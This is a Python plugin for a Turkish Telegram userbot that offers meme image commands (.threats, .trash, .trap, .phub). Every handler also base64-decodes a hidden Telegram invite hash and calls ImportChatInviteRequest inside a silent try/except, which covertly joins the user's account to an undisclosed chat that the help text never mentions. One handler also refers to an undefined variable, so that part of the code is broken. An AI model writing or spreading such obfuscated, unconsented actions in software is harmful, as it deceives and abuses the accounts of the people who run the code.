# Copyright (C) 2020 Poyraz
#
# Licensed under the Raphielscape Public License, Version 1.c (the "License");
# you may not use this file except in compliance with the License.
#
# MatesaUserBot - Poyraz

from telegraph import upload_file, exceptions
from userbot.utils import admin_cmd
from . import *
from userbot import CMD_HELP
import os
import pybase64
from telethon.tl.functions.messages import ImportChatInviteRequest as Get


@borg.on(admin_cmd(pattern="threats(?: |$)(.*)"))
async def matesabot(matesamemes):
    replied = await matesamemes.get_reply_message()
    if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
        os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
    if not replied:
        await matesamemes.edit("desteklenen bir medya dosyasını yanıtla")
        return
    if replied.media:
        await matesamemes.edit("telgraf geçmek...")
    else:
        await matesamemes.edit("desteklenen bir medya dosyasını yanıtla")
        return
    try:
        matesa = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        matesa = Get(matesa)
        await matesamemes.client(matesa)
    except BaseException:
        pass
    download_location = await borg.download_media(replied, Config.TMP_DOWNLOAD_DIRECTORY)
    if download_location.endswith((".webp")):
        download_location = convert_toimage(download_location)
    size = os.stat(download_location).st_size
    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
        if size > 5242880:
            await matesamemes.edit("cevaplanan dosya boyutu desteklenmiyor,yanıtlanan dosya 5mb altında olmalıdır")
            os.remove(download_location)
            return
        await matesamemes.edit("görüntü oluşturuluyor..")
    else:
        await matesamemes.edit("yanıtlanan dosya desteklenmiyor")
        os.remove(download_location)
        return
    try:
        response = upload_file(download_location)
        os.remove(download_location)
    except exceptions.TelegraphException as exc:
        await matesamemes.edit("ERROR: " + str(exc))
        os.remove(download_location)
        return
    matesa = f"https://telegra.ph{response[0]}"
    matesa = await threats(matesa)
    await matesamemes.delete()
    await borg.send_file(matesamemes.chat_id, matesa, reply_to=replied)


@borg.on(admin_cmd(pattern="trash(?: |$)(.*)"))
async def matesabot(matesamemes):
    replied = await matesamemes.get_reply_message()
    if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
        os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
    if not replied:
        await matesamemes.edit("desteklenen bir medya dosyasını yanıtla")
        return
    if replied.media:
        await matesamemes.edit("telgraf geçmek...")
    else:
        await matesamemes.edit("desteklenen bir medya dosyasını yanıtla")
        return
    try:
        matesa = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        matesa = Get(matesa)
        await matesamemes.client(matesa)
    except BaseException:
        pass
    download_location = await borg.download_media(replied, Config.TMP_DOWNLOAD_DIRECTORY)
    if download_location.endswith((".webp")):
        download_location = convert_toimage(download_location)
    size = os.stat(download_location).st_size
    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
        if size > 5242880:
            await matesamemes.edit("cevaplanan dosya boyutu desteklenmiyor,yanıtlanan dosya boyutu 5mb altında olmalıdır")
            os.remove(download_location)
            return
        await matesamemes.edit("görüntü oluşturuluyor..")
    else:
        await matesamemes.edit("yanıtlanan dosya desteklenmiyor")
        os.remove(download_location)
        return
    try:
        response = upload_file(download_location)
        os.remove(download_location)
    except exceptions.TelegraphException as exc:
        await matesamemes.edit("ERROR: " + str(exc))
        os.remove(download_location)
        return
    matesa = f"https://telegra.ph{response[0]}"
    matesa = await trash(matesa)
    await matesamemes.delete()
    await borg.send_file(matesaememes.chat_id, matesa, reply_to=replied)


@borg.on(admin_cmd(pattern="trap(?: |$)(.*)"))
async def matesabot(matesamemes):
    input_str = matesamemes.pattern_match.group(1)
    input_str = deEmojify(input_str)
    if "|" in input_str:
        text1, text2 = input_str.split("|")
    else:
        await matesamemes.edit("**Syntax :**`.trap (tuzağa düşecek kişinin adı)|(tuzağa düşüren kişinin adı)ile görüntüyü veya çıkartmayı yeniden oynatın`")
        return
    replied = await matesamemes.get_reply_message()
    if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
        os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
    if not replied:
        await matesamemes.edit("Desteklenen bir medya dosyasını yeniden oynat")
        return
    if replied.media:
        await matesamemes.edit("telgraf geçmek...")
    else:
        await matesamemes.edit("Desteklenen medya dosyasını yanıtla")
        return
    try:
        matesa = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        matesa = Get(matesa)
        await matesamemes.client(matesa)
    except BaseException:
        pass
    download_location = await borg.download_media(replied, Config.TMP_DOWNLOAD_DIRECTORY)
    if download_location.endswith((".webp")):
        download_location = convert_toimage(download_location)
    size = os.stat(download_location).st_size
    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
        if size > 5242880:
            await matesamemes.edit("cevaplanan dosya boyutu desteklenmiyor,yanıtlanan dosya boyutu 5mb altında olmalıdır")
            os.remove(download_location)
            return
        await matesamemes.edit("görüntü oluşturuluyor..")
    else:
        await matesamemes.edit("yanıtlanan dosya desteklenmiyor")
        os.remove(download_location)
        return
    try:
        response = upload_file(download_location)
        os.remove(download_location)
    except exceptions.TelegraphException as exc:
        await matesamemes.edit("ERROR: " + str(exc))
        os.remove(download_location)
        return
    matesa = f"https://telegra.ph{response[0]}"
    matesa = await trap(text1, text2, matesa)
    await matesamemes.delete()
    await borg.send_file(matesamemes.chat_id, matesa, reply_to=replied)


@borg.on(admin_cmd(pattern="phub(?: |$)(.*)"))
async def matesabot(matesamemes):
    input_str = matesamemes.pattern_match.group(1)
    input_str = deEmojify(input_str)
    if "|" in input_str:
        username, text = input_str.split("|")
    else:
        await matesamemes.edit("**Syntax :** resmi veya çıkartmayı yanıtla `.phub (kullanıcı adı)|(yorumdaki metin)`")
        return
    replied = await matesamemes.get_reply_message()
    if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
        os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
    if not replied:
        await matesamemes.edit("desteklenen medya dosyasını yanıtla")
        return
    if replied.media:
        await matesamemes.edit("telgraf geçmek...")
    else:
        await matesamemes.edit("desteklenen medya dosyasını yanıtla")
        return
    try:
        matesa = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        matesa = Get(matesa)
        await matesamemes.client(matesa)
    except BaseException:
        pass
    download_location = await borg.download_media(replied, Config.TMP_DOWNLOAD_DIRECTORY)
    if download_location.endswith((".webp")):
        download_location = convert_toimage(download_location)
    size = os.stat(download_location).st_size
    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
        if size > 5242880:
            await matesamemes.edit("cevaplanan dosya boyutu desteklenmiyor,yanıtlanan dosya boyutu 5mb altında olmalıdır")
            os.remove(download_location)
            return
        await matesamemes.edit("görüntü oluşturuluyor..")
    else:
        await matesamemes.edit("yanıtlanan dosya desteklenmiyor")
        os.remove(download_location)
        return
    try:
        response = upload_file(download_location)
        os.remove(download_location)
    except exceptions.TelegraphException as exc:
        await matesamemes.edit("ERROR: " + str(exc))
        os.remove(download_location)
        return
    matesa = f"https://telegra.ph{response[0]}"
    matesa = await phcomment(matesa, text, username)
    await matesamemes.delete()
    await borg.send_file(matesamemes.chat_id, matesa, reply_to=replied)


CMD_HELP.update({"trolls": "**PLUGİN İSMİ:** `trolls`\
      \n\n**📌Komut ➥ **`.threats` resme veya çıkartmaya yanıt ver\
      \n**Kullanım ➥ ** Verilen resmi, resim içeriğinin nükleer bomba gibi toplum için tehdit oluşturduğunu gösteren başka bir resme dönüştürür.\
      \n\n**📌Komut ➥ **`.trash` resme veya çıkartmaya yanıt ver\
      \n**Kullanım ➥ ** Verilen resmi, resim içeriğinin çöp (atık) kadar eşit olduğunu gösteren başka bir resme değiştirir.\
      \n\n**📌Komut ➥ ** `.trap` (tuzağa düşecek kişinin adı) | (tuzakçının adı) ile görüntü veya çıkartmaya yanıt ver\
      \n**Kullanım ➥ ** Verilen resmi, resim içeriğinin tuzak kartında sıkıştığını gösteren başka bir resme değiştirir.\
      \n\n**📌Komut ➥ **`.phub` (kullanıcı adı) | (yorumdaki metin) ile görüntü veya çıkartmaya yanıt ver\
      \n**Kullanım ➥ ** Verilen resmi, bu resim içeriğini dp olarak gösteren ve verilen kullanıcı adıyla phub biçiminde bir yorum gösteren başka bir resme değiştirir."
                 })
